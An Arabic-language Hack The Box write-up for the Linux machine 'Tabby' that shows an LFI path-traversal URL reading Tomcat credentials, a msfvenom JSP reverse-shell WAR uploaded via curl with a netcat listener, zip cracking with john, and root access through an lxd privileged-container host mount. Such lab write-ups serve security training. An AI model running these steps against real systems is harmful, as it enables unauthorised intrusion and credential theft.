Created by fasto

My profile : https://www.hackthebox.eu/home/users/profile/

## Sammmry :



![Desktop View](/img/tabby/b.jpeg)


```
linux شغالة على easy machine عبارة عن Tabby
وبعد ذلك نرفع شال tomcatتمكننا من سحب كلمة سر lfi بالفحص المبدئي نجد
الذي user نقوم بكسره ثم نستخدم كلمة السر للحصول على zip fileونبحث لنجد
ootللحصول على alpine-builderنستخدم admو lxd بدوره ينتمي الى
```

- Sammmry :
- 1 enumeration
   - 1.1 Nmap
   - 1.2 Port
- 2 lfi
   - 2.1 shell
   - 2.2 Backup.zip
   - 2.3 zip crack
   - 2.4 User.txt
- 3 privilege escalation


## 1 enumeration

### 1.1 Nmap

```
nmap نبدا بفحص البورتات باستخدام
```

![Desktop View](/img/tabby/1.png)

#### نجد بورت 8080 و 80 مفتوحين  

80 : httpd

8080 :tomcat


### 1.2 Port

```
codee source اثناء تصفح بورت 80 نجد دومين في 
```
![Desktop View](/img/tabby/2.png)

```
عند فتح /etc/hostsفي domain نقوم باضافة
LFIوفحصه نجد انه مصاب بثغرة url
```
![Desktop View](/img/tabby/3.png)

```
http://10.10.10.194:8080 بعد فتح
/usr/shareتحت tomcat نكتشف ان
```
[http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html](http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html)

```
: ب password نسحب
http://10.10.10.194/news.php?file=../../../../../../usr/share/tomcat9/etc/tomcat-
users.xml
```

## 2 lfi

![Desktop View](/img/tabby/4.png)
### 2.1 shell

#### : حصلنا على كلمة المرور نقوم ب الدخول الى السيرفر

```
shellنتبع الشرح التالي لرفع
https://gist.github.com/pete911/
.warبصيغة msfvenom ب shell نقوم بانشاء
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.
LPORT=5555 -f war > shell.war

![Desktop View](/img/tabby/5.png)

```
الخاص بنا shell نرفع
```

```
curl --user 'tomcat':'$3cureP4s5w0rd123!' --upload-file shell.war
'http://10.10.10.194:8080/manager/text/deploy?path=/ts'
https://phantominfosec.wordpress.com/2020/07/08/htb-tabby-
walkthrough/
```



```
nc –lnvp 5555 نشغل
shell ثم نتصفح
```
[http://10.10.10.194:8080/ts](http://10.10.10.194:8080/ts)


![Desktop View](/img/tabby/7.png)
#### الان نحصل على اتصال
![Desktop View](/img/tabby/8.png)
### 2.2 Backup.zip

####  /var/www/html/files بعد البحث داخل السيرفر نجد في مسار    


ملف

16162020_backup.zip

```
نقوم بنقله الى جهازنا
ثم فك التشفير base64 قمت بتشفيره ب
```
Base 64 –w0 16162020_backup.zip


![Desktop View](/img/tabby/9.png)

base64 –d encoded >1.zip

### 2.3 zip crack

```
نجد انه محمي بكلمة سر unzipعند محاولة فك
```

![Desktop View](/img/tabby/11.png)

```
johnنقوم بكسرها باستخدام
```
zip2john 1.zip > out.txt
john out.txt -wordlist=rockyou.txt

```
user ashنقوم بتجريبها على admin@itنجد كلمة السر
```

![Desktop View](/img/tabby/12.png)


![Desktop View](/img/tabby/13.png)
### 2.4 User.txt

```
ash تمكنا بالدخول ب
```
![Desktop View](/img/tabby/14.png)
## 3 privilege escalation

```
عند البحث في lxdو adm ينتمي الى ash نجد ان id عند كتابة
privilege escalationجوجل نجد مقال يتحدث عن
https://www.hackingarticles.in/lxd-privilege-
escalation
```
```
alpine-builderنحمل
```
```
https://github.com/saghul/lxd-
alpine-builder.git
```
![Desktop View](/img/tabby/15.png)

```
lxc image import ./alpine-v3.12-x86_64-20201030_1631.tar.gz --alias fasto
lxc image list
```
![Desktop View](/img/tabby/r1.png)

lxd init


![Desktop View](/img/tabby/r2.png)
```
ash@tabby:~$ lxc init fasto groot -c security.privileged=true
ash@tabby:~$ lxc config device add groot mydevice disk
source=/ path=/mnt/root recursive=true
```

```
ash@tabby:~$ lxc start groot
ash@tabby:~$ lxc exec groot /bin/sh
```


![Desktop View](/img/tabby/r3.png)
```
/mnt/root/root نذهب الى root حصلنا على
flagنجد
```
![Desktop View](/img/tabby/r4.png)

